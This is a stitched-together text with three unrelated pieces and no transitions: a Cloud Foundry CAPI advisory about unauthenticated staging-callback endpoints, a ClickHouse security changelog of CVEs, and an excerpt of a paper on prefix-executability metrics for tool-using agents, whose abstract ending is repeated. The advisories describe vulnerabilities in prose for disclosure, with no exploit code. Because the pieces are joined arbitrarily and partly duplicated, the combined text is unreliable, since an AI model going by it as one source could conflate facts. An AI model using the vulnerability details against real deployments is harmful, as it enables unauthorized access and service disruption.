  CAPI (Cloud Foundry Controller)  
  – Confirmed in CAPI up to v1.245.0 (inclusive)  
   
  Description  
  The Nginx routing configuration for Cloud Controller blocks unauthenticated access to /internal/v4/ and /internal/v5/ endpoints but omits an equivalent deny rule for /internal/v3/. As a result, the staging callback endpoints /internal/v3/staging/:guid/droplet_completed and /internal/v3/staging/:guid/build_completed are reachable from the public API listener without OAuth or mutual TLS.  
   
  An attacker with a valid build or droplet GUID can submit a forged staging callback, transition a droplet to STAGED, and persist arbitrary process metadata and sidecar data with no associated package or actor. A SpaceAuditor can enumerate GUIDs without write permissions, making this an effective privilege escalation beyond the intended role boundary.  
   
  Mitigation  
  Users of affected products are strongly encouraged to follow the mitigations below.  
   
  The Cloud Foundry project recommends upgrading the following releases:  
   
  CAPI  
  – Upgrade CAPI to v1.246.0 or greater  
   
  CF Deployment  
  – Upgrade cf-deployment version to v60.7.0 or greater  
      – Includes CAPI v1.247.0  
   
  Credit  
  This issue was responsibly reported by Minseong Kim (mak3bread).  
   
  History  
  2026-10-20: Initial vulnerability report published.

Navigation     Security changelog       Home     Database       Solutions       Integrations       Resources                    Security changelog     Security changelog detailing security related updates and changes       ​      Fixed in ClickHouse v26.10.3.7, 2026-10-30  
   ​       CVE-2026-116366   
 An issue has been discovered in ClickHouse Server that, under certain conditions, could allow an unauthenticated user with network access to execute arbitrary code on the ClickHouse Server. 
 Fix has been pushed to the following open-source versions: v26.3.62.3-lts, v26.8.36.3-lts, v26.9.27.3-stable, v26.10.3.7-stable. 
 A fix for this vulnerability has been applied to all ClickHouse Cloud and BYOC deployments. 
 Credits:  Elshad Toklayev . 
   ​      Fixed in ClickHouse v25.1.5.5, 2025-01-05  
   ​       CVE-2025-1385   
 When the library bridge feature is enabled, the clickhouse-library-bridge exposes an HTTP API on localhost. This allows clickhouse-server to dynamically load a library from a specified path and execute it in an isolated process. Combined with the ClickHouse table engine functionality that permits file uploads to specific directories, a misconfigured server can be exploited by an attacker with privileges to access both table engines, allowing them to execute arbitrary code on the ClickHouse server. 
 Fix has been pushed to the following open-source versions: v24.3.18.6, v24.8.14.27, v24.11.5.34, v24.12.5.65, v25.1.5.5 
 ClickHouse Cloud is unaffected by this vulnerability. 
 Credits:  Arseniy Dugin  
   ​      Fixed in ClickHouse v24.5, 2024-08-01  
   ​       CVE-2024-6873   
 It is possible to redirect the execution flow of the ClickHouse server process from an unauthenticated vector by sending a specially crafted request to the ClickHouse server native interface. This redirection is limited to what is available within a 256-byte range of memory at the time of execution. This vulnerability was identified through our Bugbounty program and no known Proof of Concept Remote Code Execution (RCE) code has been produced or exploited. 
 Fix has been pushed to the following open-source versions: v23.8.15.35-lts, v24.3.4.147-lts, v24.4.2.141-stable, v24.5.1.1763, v24.6.1.4423-stable 
 ClickHouse Cloud uses different versioning and a fix for this vulnerability was applied to all instances running v24.2 onward. 
 Credits:  malacupa (Independent researcher) 
   ​      Fixed in ClickHouse v24.1, 2024-01-30  
   ​       CVE-2024-22412   
 When toggling between user roles while using ClickHouse with query cache enabled, there is a risk of obtaining inaccurate data. ClickHouse advises users with vulnerable versions of ClickHouse not to use the query cache when their application dynamically switches between various roles. 
 Fix has been pushed to the following open-source versions: v24.1.1.2048, v24.1.8.22-stable, v23.12.6.19-stable, v23.8.12.13-lts, v23.3.22.3-lts 
 ClickHouse Cloud uses different versioning and a fix for this vulnerability was applied at v24.0.2.54535. 
 Credits:  Evan Johnson and Alan Braithwaite from Runreveal team - More information can be found on  their blog post . 
   ​      Fixed in ClickHouse v23.10.5.20, 2023-11-26  
   ​       CVE-2023-47118   
 A heap buffer overflow vulnerability affecting the native interface running by default on port 9000/tcp. An attacker, by triggering a bug in the T64 compression codec, can cause the ClickHouse server process to crash. This vulnerability can be exploited without the need to authenticate. 
 Fix has been pushed to the following open-source versions: v23.10.2.13, v23.9.4.11, v23.8.6.16, v23.3.16.7 
 ClickHouse Cloud uses different versioning and a fix for this vulnerability was applied at v23.9.2.47475. 
 Credits:  malacupa (Independent researcher) 
   ​       CVE-2023-48298   
 An integer underflow vulnerability in the FPC compressions codec. An attacker can use it to cause the ClickHouse server process to crash. This vulnerability can be exploited without the need to authenticate. 
 Fix has been pushed to the following open-source versions: v23.10.4.25, v23.9.5.29, v23.8.7.24, v23.3.17.13. 
 ClickHouse Cloud uses different versioning and a fix for this vulnerability was applied at v23.9.2.47475. 
 Credits:  malacupa (Independent researcher) 
   ​       CVE-2023-48704   
 A heap buffer overflow vulnerability affecting the native interface running by default on port 9000/tcp. An attacker, by triggering a bug in the Gorilla codec, can cause the ClickHouse server process to crash. This vulnerability can be exploited without the need to authenticate. 
 Fix has been pushed to the following open-source versions: v23.10.5.20, v23.9.6.20, v23.8.8.20, v23.3.18.15. 
 ClickHouse Cloud uses different versioning and a fix for this vulnerability was applied at v23.9.2.47551. 
 Credits:  malacupa (Independent researcher) 
   ​      Fixed in ClickHouse 22.9.1.2603, 2022-09-22  
   ​      CVE-2022-44011  
 A heap buffer overflow issue was discovered in ClickHouse server. A malicious user with ability to load data into ClickHouse server could crash the ClickHouse server by inserting a malformed CapnProto object. 
 Fix has been pushed to version 22.9.1.2603, 22.8.2.11, 22.7.4.16, 22.6.6.16, 22.3.12.19 
 Credits: Kiojj (independent researcher) 
   ​      CVE-2022-44010  
 A heap buffer overflow issue was discovered in ClickHouse server. An attacker could send a specially crafted HTTP request to the HTTP Endpoint (listening on port 8123 by default), causing a heap-based buffer overflow that crashes the ClickHouse server process. This attack does not require authentication. 
 Fix has been pushed to version 22.9.1.2603, 22.8.2.11, 22.7.4.16, 22.6.6.16, 22.3.12.19 
 Credits: Kiojj (independent researcher) 
   ​      Fixed in ClickHouse 21.10.2.15, 2021-10-18  
   ​      CVE-2021-43304  
 Heap buffer overflow in ClickHouse’s LZ4 compression codec when parsing a malicious query. There is no verification that the copy operations in the LZ4::decompressImpl loop and especially the arbitrary copy operation  wildCopy<copy_amount>(op, ip, copy_end) , don’t exceed the destination buffer’s limits. 
 Credits: JFrog Security Research Team 
   ​      CVE-2021-43305  
 Heap buffer overflow in ClickHouse’s LZ4 compression codec when parsing a malicious query. There is no verification that the copy operations in the LZ4::decompressImpl loop and especially the arbitrary copy operation  wildCopy<copy_amount>(op, ip, copy_end) , don’t exceed the destination buffer’s limits. This issue is very similar to CVE-2021-43304, but the vulnerable copy operation is in a different wildCopy call. 
 Credits: JFrog Security Research Team 
   ​      CVE-2021-42387  
 Heap out-of-bounds read in ClickHouse’s LZ4 compression codec when parsing a malicious query. As part of the LZ4::decompressImpl() loop, a 16-bit unsigned user-supplied value (‘offset’) is read from the compressed data. The offset is later used in the length of a copy operation, without checking the upper bounds of the source of the copy operation. 
 Credits: JFrog Security Research Team 
   ​      CVE-2021-42388  
 Heap out-of-bounds read in ClickHouse’s LZ4 compression codec when parsing a malicious query. As part of the LZ4::decompressImpl() loop, a 16-bit unsigned user-supplied value (‘offset’) is read from the compressed data. The offset is later used in the length of a copy operation, without checking the lower bounds of the source of the copy operation. 
 Credits: JFrog Security Research Team 
   ​      CVE-2021-42389  
 Divide-by-zero in ClickHouse’s Delta compression codec when parsing a malicious query. The first byte of the compressed buffer is used in a modulo operation without being checked for 0. 
 Credits: JFrog Security Research Team 
   ​      CVE-2021-42390  
 Divide-by-zero in ClickHouse’s DeltaDouble compression codec when parsing a malicious query. The first byte of the compressed buffer is used in a modulo operation without being checked for 0. 
 Credits: JFrog Security Research Team 
   ​      CVE-2021-42391  
 Divide-by-zero in ClickHouse’s Gorilla compression codec when parsing a malicious query. The first byte of the compressed buffer is used in a modulo operation without being checked for 0. 
 Credits: JFrog Security Research Team 
   ​      Fixed in ClickHouse 21.4.3.21, 2021-04-12  
   ​      CVE-2021-25263  
 An attacker that has CREATE DICTIONARY privilege, can read arbitary file outside permitted directory. 
 Fix has been pushed to versions 20.8.18.32-lts, 21.1.9.41-stable, 21.2.9.41-stable, 21.3.6.55-lts, 21.4.3.21-stable and later. 
 Credits:  Vyacheslav Egoshin  
   ​      Fixed in ClickHouse Release 19.14.3.3, 2019-09-10  
   ​      CVE-2019-15024  
 Аn attacker that has write access to ZooKeeper and who can run a custom server available from the network where ClickHouse runs, can create a custom-built malicious server that will act as a ClickHouse replica and register it in ZooKeeper. When another replica will fetch data part from the malicious replica, it can force clickhouse-server to write to arbitrary path on filesystem. 
 Credits: Eldar Zaitov of Yandex Information Security Team 
   ​      CVE-2019-16535  
 Аn OOB read, OOB write and integer underflow in decompression algorithms can be used to achieve RCE or DoS via native protocol. 
 Credits: Eldar Zaitov of Yandex Information Security Team 
   ​      CVE-2019-16536  
 Stack overflow leading to DoS can be triggered by a malicious authenticated client. 
 Credits: Eldar Zaitov of Yandex Information Security Team 
   ​      Fixed in ClickHouse Release 19.13.6.1, 2019-09-20  
   ​      CVE-2019-18657  
 Table function  url  had the vulnerability allowed the attacker to inject arbitrary HTTP headers in the request. 
 Credits:  Nikita Tikhomirov  
   ​      Fixed in ClickHouse Release 18.12.13, 2018-09-10  
   ​      CVE-2018-14672  
 Functions for loading CatBoost models allowed path traversal and reading arbitrary files through error messages. 
 Credits: Andrey Krasichkov of Yandex Information Security Team 
   ​      Fixed in ClickHouse Release 18.10.3, 2018-08-13  
   ​      CVE-2018-14671  
 unixODBC allowed loading arbitrary shared objects from the file system which led to a Remote Code Execution vulnerability. 
 Credits: Andrey Krasichkov and Evgeny Sidorov of Yandex Information Security Team 
   ​      Fixed in ClickHouse Release 1.1.54388, 2018-06-28  
   ​      CVE-2018-14668  
 “remote” table function allowed arbitrary symbols in “user”, “password” and “default_database” fields which led to Cross Protocol Request Forgery Attacks. 
 Credits: Andrey Krasichkov of Yandex Information Security Team 
   ​      Fixed in ClickHouse Release 1.1.54390, 2018-07-06  
   ​      CVE-2018-14669  
 ClickHouse MySQL client had “LOAD DATA LOCAL INFILE” functionality enabled that allowed a malicious MySQL database read arbitrary files from the connected ClickHouse server. 
 Credits: Andrey Krasichkov and Evgeny Sidorov of Yandex Information Security Team 
   ​      Fixed in ClickHouse Release 1.1.54131, 2017-01-10  
   ​      CVE-2018-14670

      Title: Prefix Executability: Evaluating Tool-Using Agents Beyond Final Success 
      Authors:  Amir H. Rezaeian ,  Weiyi Sun ,  Yassine Benajiba ,  Dan Roth               View a PDF of the paper titled Prefix Executability: Evaluating Tool-Using Agents Beyond Final Success, by Amir H. Rezaeian and 3 other authors 
     View PDF 
     HTML (experimental) 



     
             Abstract: Tool-use benchmarks often score agents by final task success, but terminal outcomes can obscure whether the intermediate tool-call trajectory was executable. We propose prefix executability as a trajectory-level evaluation protocol for tool-using agents. The protocol measures whether every prefix of a predicted tool-call sequence remains executable under tool schemas, state preconditions, and data dependencies, and summarizes reliability using Prefix Executability Curves (PEC), First-Error Depth (FED), Trajectory Executability Rate (TER), horizon-normalized AUC-PEC, and Recovery Rate (RR). We instantiate the protocol on stratified samples from BFCL-v3 multi-turn and ToolSandbox, and on the complete Airline/Retail base splits of $\tau^3$-bench. We observe that outcome-only and prefix-level rankings diverge: agents whose execution is conditioned on an unverified plan often achieve higher point-estimate final success than non-plan-conditioned baselines while substantially lowering TER and AUC-PEC. These divergences are precisely the failure modes that prefix executability is designed to expose: they reveal whether apparent success rests on an executable trajectory, where invalidity first enters, and whether success follows recovery from an earlier failure. As a validation intervention, explicit pre-execution plan checking can improve executable-prefix survival while maintaining competitive terminal success. These results show that final success alone is insufficient for evaluating tool-use agents and that prefix-level executability provides an actionable reliability signal for comparing agents, diagnosing failures, and assessing validation mechanisms.

These divergences are precisely the failure modes that prefix executability is designed to expose: they reveal whether apparent success rests on an executable trajectory, where invalidity first enters, and whether success follows recovery from an earlier failure. As a validation intervention, explicit pre-execution plan checking can improve executable-prefix survival while maintaining competitive terminal success. These results show that final success alone is insufficient for evaluating tool-use agents and that prefix-level executability provides an actionable reliability signal for comparing agents, diagnosing failures, and assessing validation mechanisms. 
  
 
 
  1  Introduction 

 
 Tool-using language agents operate over APIs, user-defined tools, and interactive software environments where correctness depends on more than a final answer. A valid run must maintain an executable sequence of intermediate actions while respecting tool schemas, cross-step dependencies, and evolving environment state  [ 1 ,  2 ,  3 ,  4 ] . This requirement is especially acute in multi-turn settings, where an early invalid call can corrupt later state or force the agent into recovery behavior that is invisible to outcome-only scoring  [ 3 ,  4 ,  5 ,  6 ] . Consider a service workflow in which an agent first retrieves a record, then passes the returned identifier to update, payment, or notification tools. A later call may be syntactically well formed but non-executable if it references a stale identifier, skips a required precondition, or applies an update before the corresponding state exists; a subsequent repair can still produce the desired final state while hiding where the trajectory first became invalid. 
 
 
 Recent evaluation work has moved beyond simple terminal accuracy. T-Eval decomposes tool use into step-wise subskills  [ 7 ] ; ToolSandbox evaluates task-specified intermediate and final conditions and checks for prohibited states or events  [ 4 ] ; TRAJECT-Bench scores tool selection, argument correctness, and dependency ordering over full trajectories  [ 8 ] ; ToolPRMBench and AgentProcessBench assess local process quality  [ 9 ,  10 ] ; and procedure-aware evaluation shows that nominally successful runs can still violate task procedures  [ 11 ] . TRACE adds reference-free assessment of efficiency, hallucination, and adaptivity over tool-use trajectories  [ 12 ] . Robustness studies further probe query perturbations, tool-set changes, and injected execution faults  [ 13 ,  14 ] . These efforts make a remaining gap clear: standard metrics still rarely quantify how long a naturally generated rollout remains executable before its first invalid prefix, or how often final success is achieved only after entering a failure regime. 
 
 
 Prefix executability complements these evaluations by checking the execution feasibility of the actual emitted rollout under explicit tool and state semantics. It credits alternative executable action sequences without requiring one gold path and records first failure, survival, and recovery. Appendix   A   compares what prior evaluation protocols measure. 
 
 
 We study  prefix-level executability failures : trajectory prefixes that may look plausible as text but are non-executable under the available tool schema, explicit preconditions, cross-step references, or current environment state. We argue that prefix executability is a missing reliability axis because final success and reference-trajectory match conflate three questions: how long the rollout remains valid, where validity first breaks, and whether later actions recover from the break. We therefore formalize executable prefixes and report a metric family centered on Prefix Executability Curves (PEC), First-Error Depth (FED), horizon-normalized AUC-PEC, Trajectory Executability Rate (TER), and Recovery Rate (RR). These metrics primarily diagnose reliability; when reported alongside trajectory
length, latency, or monetary cost, they also support efficiency-sensitive
analysis by distinguishing short, valid rollouts from long or failure-prone ones. 
 
 
 These distinctions are operationally important in cost-sensitive tool use. In workflows that trigger external transactions, consume scarce resources, modify persistent state, or require human escalation, the depth of the first invalid action can determine both the cost of failure and the feasibility of recovery. Prefix executability therefore provides a practical evaluation signal for deciding not only whether an agent eventually succeeds, but also whether execution remains uninterrupted or requires recovery along the way. 
 
 
 The paper is evaluation-first. We deliberately use a minimal Dual-Loop planner-verifier intervention only as a controlled probe: we test whether pre-execution validation improves those metrics even when final success rankings tell a different story. This framing separates the evaluation contribution from the particular intervention and lets us ask when plan conditioning helps tool use, and when it amplifies invalid intermediate structure. 
 
 
 Our contributions are: 
 
  1.  
 
 We formalize executable prefixes for tool-using agents and define PEC, FED, TER, AUC-PEC, and RR as a prefix-level evaluation protocol for variable-horizon trajectories. Appendix   B   establishes exact properties and consistency under explicit sampling assumptions. 
  
  2.  
 
 We instantiate the protocol on BFCL v3 multi-turn and ToolSandbox with stratified 200-example samples, and on all 164 Airline/Retail base-split tasks in     τ  3   \tau^{3}   -bench, using shared task IDs across methods and models, and task-level confidence intervals. 
  
  3.  
 
 We show that outcome-only and prefix-level rankings can diverge: unverified plan conditioning can improve final success while sharply reducing executability, whereas pre-execution validation consistently improves TER, AUC-PEC, and early PEC across three LLM conditions on BFCL v3 and ToolSandbox. A representative BFCL setting illustrates the pattern: an unverified plan-conditioned executor can reach the correct terminal outcome while emitting invalid intermediate tool-call prefixes, whereas Dual-Loop preserves terminal performance while restoring prefix executability. The     τ  3   \tau^{3}   -bench audit further demonstrates that prefix reliability and terminal success can rank methods differently. 
  
 
 
 
 We evaluate BFCL v3 and ToolSandbox because together they cover multi-step function composition and stateful, on-policy tool interaction  [ 3 ,  4 ] . The Airline/Retail audit evaluates the protocol in policy-constrained user–agent–environment interaction in     τ  3   \tau^{3}   -bench. Together, the three benchmarks cover 564 task instances per model–method condition and 6,768 rollouts. 
 
 
 
  2  Prefix-Level Executability Evaluation 

 
  2.1  Executable Prefixes 

 
 We model an agent rollout as a predicted trajectory      τ  ^   =   (   a  1   ,  …  ,   a  T   )    \hat{\tau}=(a_{1},\ldots,a_{T})   , where each ordinary action     a  t   a_{t}    is a tool invocation with arguments. Let     s  t   s_{t}    denote the environment state immediately before executing     a  t   a_{t}   . An action is executable if the selected tool is available, the arguments conform to its schema, all explicit preconditions hold in     s  t   s_{t}   , and any referenced intermediate values are present and type-consistent. 
 
 
 A prefix       τ  ^      ≤  k    =   (   a  1   ,  …  ,   a  k   )    \hat{\tau}_{\leq k}=(a_{1},\ldots,a_{k})    is executable if every action in the prefix executes successfully under the states induced by prior actions. This definition evaluates feasibility rather than agreement with a single reference trajectory, which matters because many tool tasks admit multiple valid execution orders or alternative executable call sequences  [ 3 ,  4 ,  6 ] . 
 
 
 The benchmark-side scorer is deterministic and uses no LLM judge. It checks exposed tools, argument binding and validators, current and type-compatible references, information availability, explicit preconditions, and benchmark acceptance of the transition. Accepted actions advance state; the first rejection fixes FED. Prefix replay then stops, while the full rollout is retained for final success and recovery. This scorer is distinct from the LLM-based pre-execution verifier. Appendix   C.1   specifies the procedure and benchmark-specific semantics.

  2.4  First-Failure Annotation Protocol 

 
 When      FED  i   ≤   T  i    \mathrm{FED}_{i}\leq T_{i}   , we annotate the action at the first invalid prefix with one primary cause: schema failure, dependency failure, precondition failure, state-consistency failure, or information failure. The labels are mutually exclusive by deterministic tie-breaking in that order, so category counts sum to the RR-Eligible set. These labels are diagnostic only; they are not used to compute PEC, TER, AUC-PEC, or RR. The taxonomy is benchmark-agnostic but reflects stressors emphasized by BFCL, ToolSandbox, NESTFUL, FAIL-TaLMs, and function-calling robustness studies  [ 3 ,  4 ,  5 ,  17 ,  13 ] . 
 
 
 
  2.5  Validation Intervention 

 
 Dual-Loop is included as a controlled validation intervention, not as the main architectural claim. Given the user goal, tool schema, and a compact state summary, a planner proposes a structured plan. A verifier checks tool existence, schema conformity, explicit preconditions, and variable bindings. If verification fails, the planner revises the plan using verifier feedback; once verification succeeds, the approved plan conditions a ReAct executor, which alone issues environment tool calls. Planner and verifier messages are therefore method-side computation, not benchmark tool actions, and all prefix metrics are computed on the executed tool trajectory. The intervention follows planner-executor and verifier-guided generation work, but here serves as a stress test for the evaluation protocol  [ 18 ,  19 ,  20 ,  21 ,  22 ] . Appendix   D   gives the schematic. 
 
 
 
  2.6  Benchmarks and Experimental Setup 

 
 We use BFCL v3 and ToolSandbox to test multi-step function-calling correctness and stateful on-policy interaction. BFCL v3 provides multi-turn function-calling scenarios under a standardized interface, making it a test bed for schema, ordering, and cross-step dependency errors  [ 3 ] . ToolSandbox adds stateful tool execution, implicit state dependencies, an on-policy user simulator, and dynamic intermediate/final milestone evaluation, making recovery after intermediate failure observable during the rollout  [ 4 ] . 
 
 
 For each benchmark, we evaluate a stratified sample of     N  =  200   N=200    instances. The BFCL v3 subset is stratified uniformly over the four multi-turn categories used in this study:  multi_turn_base ,  multi_turn_miss_func ,  multi_turn_miss_param , and  multi_turn_long_context , with    50  50    tasks from each. The ToolSandbox subset contains    200  200    supported open-source scenario templates selected by a deterministic greedy multi-label stratifier over scenario-category labels. Sampling is performed once per dataset, and the same task IDs are reused for every model and method, so all method comparisons are paired at the task level. The BFCL-v3/ToolSandbox grid comprises      200  ×  2  ×  3  ×  4   =  4,800   200\times 2\times 3\times 4=4{,}800    evaluated rollouts across two datasets, three models, and four agent variants. We report 95% task-level confidence intervals. Marginal-interval overlap does not establish paired significance, and we do not infer paired effects from it. Compute resources for the hosted-inference and local-orchestration components of the BFCL-v3/ToolSandbox grid are reported in Appendix   E  . 
 
 
 Both benchmarks are instrumented at the action level. For each rollout, we log whether each predicted call is executable, the first failing step, its primary error label, and whether the episode later reaches benchmark-defined task success. On BFCL v3, this requires prefix-by-prefix replay of the predicted sequence rather than scoring only the terminal trace. On ToolSandbox, we derive the same quantities from executed trajectories and benchmark-provided traces, so state transitions and downstream recovery are observed directly rather than inferred post hoc. 
 
 
 We evaluate all 50 Airline and 114 Retail base-split tasks in     τ  3   \tau^{3}   -bench under the text half-duplex protocol (recorded version v1.0.1). This is complete coverage of those two base splits, not all benchmark domains. One rollout per task, model, and method yields 1,968 Airline/Retail episodes. Across the three benchmarks, the main grid contains 6,768 rollouts over 564 tasks per model–method condition. Appendix   F   reports the full scalar metrics, uncertainty, costs, and a separate paired verifier-sensitivity study. Task-level intervals describe variation across tasks under the fixed protocol, not repeated-run variability within a task. 
 
 
 
  2.7  Agent Variants and Experimental Controls 

 
 We compare a nested intervention ladder with four variants: 
 
  1.  
 
  ReAct : interleaved reasoning and acting without explicit plan validation  [ 2 ] . 
  
  2.  
 
  Prompt Planning : a planner-first variant in which a plan is generated but not enforced during execution. 
  
  3.  
 
  Plan-Conditioned ReAct : the generated plan is provided as an explicit control signal during execution. 
  
  4.  
 
  Dual-Loop : the same plan-conditioned executor augmented with pre-execution verification. 
  
 
 Within each LLM condition, executor calls share the same model setting, tool specification format, decoding strategy, and benchmark horizon cap. Planner and verifier calls occur before execution and are counted as method cost rather than tool actions in     T  i   T_{i}   . Additional provider-specific decoding and rollout settings are reported in Appendix   E  . We report three LLM conditions: GPT-5.4 ( reasoning.effort=high ), GPT-4.1, and Llama-4-Maverick-Instruct.

  4  Conclusion 

 
 Reliable tool use is not only a question of whether an agent eventually succeeds, but whether its trajectory remains executable as it unfolds. This paper introduced prefix executability as an evaluation protocol for tool-using agents, formalizing PEC, FED, TER, AUC-PEC, and RR for variable-horizon rollouts. Across the three-benchmark audit, prefix reliability and terminal outcome provide complementary information. Validation improves prefix reliability on BFCL-v3 and ToolSandbox, while the Airline/Retail transfer audit and paired sensitivity study show that this benefit is environment-dependent. Exact identities explain how high final success can coexist with frequent prefix failure, and cost measurements expose the operational price of validation. Evaluations should therefore report uninterrupted executability, recovery, terminal success, and agent-side cost together. 
 
 
 Although we report PEC, FED, TER, AUC-PEC, and RR as retrospective evaluation
metrics over completed rollouts, the underlying executable-prefix predicate is
prefix-local. When available during execution, it can be checked after each
candidate tool action to support runtime monitoring, repair, replanning, or
human escalation before invalid state is propagated. Aggregated over rollouts,
the same signals can guide offline choices such as prompt design, validation
budgets, and agent selection. These uses remain complementary to the paper’s
evaluation focus: prefix executability exposes whether and where a trajectory
becomes invalid, but it does not by itself certify semantic correctness, safety,
privacy, or fairness. Developing closed-loop agents and deployment policies that
optimize against these signals is an important direction for future work. 
 
 
 
 Limitations 

 
 The study is an audit rather than a complete leaderboard evaluation: BFCL-v3 and ToolSandbox each contribute 200 sampled tasks, ToolSandbox is restricted to supported local-tool scenarios, and     τ  3   \tau^{3}    coverage is complete only for the Airline/Retail base splits. Task-level intervals do not measure within-task repeated-seed variation. The main-grid tables provide marginal intervals; paired intervals are reported for the separate verifier-sensitivity study. Fixed-cohort PEC reflects both reaching a depth and retaining validity, so its decline is not an error-only statistic. 
 
 
 Executability assumes explicit schemas, preconditions, and benchmark-accessible state. Partially observed web or GUI environments may require state estimation or learned preconditions, and executability does not certify semantic correctness. We did not evaluate a matched schema-constrained-decoding baseline, so the reported rankings are not established under such constraints. These constraints can prevent malformed arguments, while prefix checking additionally covers object existence, provenance, state preconditions, and transition acceptance. 
 
 
 The intervention combines validation/revision with extra inference. The sensitivity study varies verifier capacity and budget, but its acceptance wrapper changes executor guidance; it does not fully separate validation logic from compute or context effects. Per-method cost telemetry is available for the     τ  3   \tau^{3}    audit, whereas the BFCL-v3/ToolSandbox grid has aggregate runtime only. Broader claims require additional domains, repeated runs, and matched constrained-decoding and repair controls. 
 
 
 Broader impacts. 

 
 Prefix-level executability can improve oversight of tool-using agents by
identifying invalid API calls, unresolved dependencies, and state-precondition
violations before they are obscured by final-success scores. This is most useful
in workflows where tool calls modify persistent state, consume resources,
trigger external actions, or require human escalation. The same diagnostics may
also make autonomous tool use easier to deploy in settings with privacy,
security, fairness, or service-access risks. Moreover, an executable trajectory
can still be unsafe, biased, privacy-violating, or misaligned with user intent.
Prefix executability should therefore be treated as one reliability signal and
combined with domain-specific safety policies, privacy controls, security
review, and human oversight in consequential applications.
